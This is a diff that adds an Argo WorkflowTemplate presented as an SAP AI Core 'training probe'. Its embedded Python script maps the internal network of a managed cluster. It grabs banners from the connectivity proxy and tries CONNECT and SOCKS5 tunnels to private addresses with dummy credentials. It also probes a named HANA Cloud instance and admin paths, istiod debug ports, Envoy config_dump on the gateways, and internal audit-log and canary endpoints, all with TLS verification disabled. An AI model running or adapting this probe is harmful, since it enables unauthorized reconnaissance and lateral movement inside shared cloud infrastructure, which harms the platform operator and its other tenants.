@@ -1,0 +1,204 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v5
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v5"
+    executables.ai.sap.com/description: "training probe v5 - connectivity proxy + HANA cloud + egress endpoints"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import socket, ssl, struct, time, re, json
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT5] {k}: {str(v)[:12000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=10):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:3000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        def tcp_banner(host, port, send=None, timeout=8):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                s.connect((host, port))
+                if send:
+                    s.sendall(send)
+                data = b""
+                deadline = time.time() + timeout
+                while time.time() < deadline:
+                    try:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        data += chunk
+                        if len(data) > 8192: break
+                    except: break
+                s.close()
+                return data.decode(errors="replace")
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}"
+
+        def tls_banner(host, port, timeout=8):
+            try:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with socket.create_connection((host, port), timeout=timeout) as raw:
+                    with ctx.wrap_socket(raw, server_hostname=host) as s:
+                        cert = s.getpeercert(binary_form=True)
+                        info = s.getpeercert()
+                        try:
+                            s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
+                            data = b""
+                            deadline = time.time() + 5
+                            while time.time() < deadline:
+                                try:
+                                    chunk = s.recv(4096)
+                                    if not chunk: break
+                                    data += chunk
+                                    if len(data) > 8192: break
+                                except: break
+                        except: data = b""
+                        return info, data.decode(errors="replace")
+            except Exception as e:
+                return None, f"ERR:{type(e).__name__}:{e}"
+
+        report("START", "probe-train-v5 - connectivity proxy + HANA + egress")
+
+        # ── 1. SAP CONNECTIVITY PROXY ─────────────────────────────────────────
+        report("---", "=== 1. SAP CONNECTIVITY PROXY ===")
+        CP_HOST = "connectivity-proxy.connectivity-proxy.svc.cluster.local"
+
+        # Port 20001 — HTTP proxy (RFC 7235 / HTTP CONNECT)
+        report("CP_20001_TCP", tcp_banner(CP_HOST, 20001,
+            send=b"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n",
+            timeout=8))
+
+        # Port 20001 bare banner (no send)
+        report("CP_20001_BANNER", tcp_banner(CP_HOST, 20001, timeout=6))
+
+        # Port 20003 — SOCKS5
+        # SOCKS5 greeting: version=5, nmethods=1, method=0 (no auth)
+        SOCKS5_HELLO = b"\x05\x01\x00"
+        report("CP_20003_SOCKS5", tcp_banner(CP_HOST, 20003, send=SOCKS5_HELLO, timeout=8))
+
+        # Port 20004
+        report("CP_20004_BANNER", tcp_banner(CP_HOST, 20004, timeout=6))
+        report("CP_20004_HTTP", tcp_banner(CP_HOST, 20004,
+            send=b"GET / HTTP/1.0\r\nHost: connectivity-proxy\r\n\r\n", timeout=6))
+
+        # Try HTTP GET on each port
+        for port in [20001, 20002, 20003, 20004, 8080, 80, 443]:
+            body, code, hdrs = http_get(f"http://{CP_HOST}:{port}/", timeout=6)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"CP_HTTP_{port}", f"[{code}] {body[:500]}")
+
+        # Try to use connectivity proxy as HTTP CONNECT tunnel to reach on-prem
+        # If it's an open HTTP CONNECT proxy, we could tunnel through it
+        report("---", "=== 1b. CONNECTIVITY PROXY TUNNEL ATTEMPT ===")
+        # Try CONNECT to a known on-prem-style host via the proxy
+        for target in ["sap.com:443", "10.0.0.1:80", "10.250.0.1:80"]:
+            r = tcp_banner(CP_HOST, 20001,
+                send=f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\nProxy-Authorization: Basic dXNlcjpwYXNz\r\n\r\n".encode(),
+                timeout=8)
+            report(f"CP_CONNECT_{target}", r[:300])
+
+        # ── 2. HANA CLOUD INSTANCE ────────────────────────────────────────────
+        report("---", "=== 2. HANA CLOUD INSTANCE ===")
+        HANA_HOST = "8ab6c8b4-9bea-46de-909e-0ef8e2e44124.hna1.prod-eu10.hanacloud.ondemand.com"
+
+        # TLS banner — get cert info
+        cert_info, http_body = tls_banner(HANA_HOST, 443, timeout=10)
+        report("HANA_TLS_CERT", str(cert_info)[:2000] if cert_info else "no_cert")
+        report("HANA_HTTP_BODY", http_body[:1000])
+
+        # Try common HANA Cloud / XSA paths
+        for path in ["/", "/ui", "/sap/hana/xs/adminui2/",
+                     "/sap/bc/ngap/", "/sap/hana/cloud/",
+                     "/v1/", "/api/v1/", "/.well-known/openid-configuration"]:
+            body, code, hdrs = http_get(f"https://{HANA_HOST}{path}", timeout=10)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"HANA_{path.replace('/','_')}", f"[{code}] {body[:800]}")
+
+        # ── 3. ISTIOD xDS ENDPOINT ────────────────────────────────────────────
+        report("---", "=== 3. ISTIOD xDS ===")
+        # istiod listens on 15012 (xDS over mTLS), 15010 (plaintext), 15014 (debug)
+        for port in [15010, 15014, 8080]:
+            body, code, _ = http_get(f"http://istiod.istio-system.svc:{port}/debug/", timeout=6)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"ISTIOD_{port}_debug", f"[{code}] {body[:800]}")
+            body2, code2, _ = http_get(f"http://istiod.istio-system.svc:{port}/", timeout=6)
+            if code2 and "ERR:timed" not in body2 and "ERR:Connection" not in body2:
+                report(f"ISTIOD_{port}_root", f"[{code2}] {body2[:500]}")
+
+        # ── 4. GATEWAY PROXY ACCESS LOGGER ───────────────────────────────────
+        report("---", "=== 4. GATEWAY PROXY ACCESS LOGGER ===")
+        for port in [8083, 8080, 80]:
+            body, code, _ = http_get(
+                f"http://gateway-proxy-access-logger.istio-system:{port}/", timeout=6)
+            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                report(f"GPAL_{port}", f"[{code}] {body[:500]}")
+        # TCP banner on 8083 (gRPC)
+        report("GPAL_8083_TCP", tcp_banner("gateway-proxy-access-logger.istio-system", 8083,
+            send=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", timeout=6))
+
+        # ── 5. INTERNAL CANARY ENDPOINT ──────────────────────────────────────
+        report("---", "=== 5. INTERNAL CANARY / DEV ENDPOINTS ===")
+        for host in ["api.intwdf-eu.mlfdev.internal.canary.k8s.ondemand.com",
+                     "genai-optimizations.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"]:
+            body, code, hdrs = http_get(f"https://{host}/", timeout=10)
+            report(f"CANARY_{host.split('.')[0]}", f"[{code}] {body[:800]}")
+            body2, code2, _ = http_get(
+                f"https://{host}/.well-known/openid-configuration", timeout=8)
+            if code2 == 200:
+                report(f"OIDC_{host.split('.')[0]}", body2[:1000])
+
+        # ── 6. SAP BTP AUDIT LOG & METERING ──────────────────────────────────
+        report("---", "=== 6. BTP SERVICES ===")
+        for url in [
+            "https://api.auditlog.cf.eu10.hana.ondemand.com:8081/",
+            "https://maas-metering.cfapps.eu10.hana.ondemand.com/",
+            "https://events-service.cfapps.eu10.hana.ondemand.com/",
+        ]:
+            body, code, _ = http_get(url, timeout=10)
+            label = url.split("//")[1].split(".")[0]
+            report(f"BTP_{label}", f"[{code}] {body[:500]}")
+
+        # ── 7. EGRESS GATEWAY ADMIN ───────────────────────────────────────────
+        report("---", "=== 7. EGRESS GATEWAY ADMIN ===")
+        for svc in ["istio-egressgateway.istio-system.svc.cluster.local",
+                    "istio-ingressgateway.istio-system.svc.cluster.local"]:
+            body, code, _ = http_get(f"http://{svc}:15000/config_dump", timeout=15)
+            report(f"EGRESS_{svc.split('.')[0]}_cfgdump_size",
+                   f"[{code}] len={len(body)}")
+            if code == 200:
+                # Extract cluster names from egress config
+                names = list(dict.fromkeys(re.findall(r'"name"\s*:\s*"([^"]{5,80})"', body)))
+                report(f"EGRESS_{svc.split('.')[0]}_clusters", names[:40])
+
+        report("DONE", "probe-train-v5 complete")
+        EOF
+  entrypoint: probe
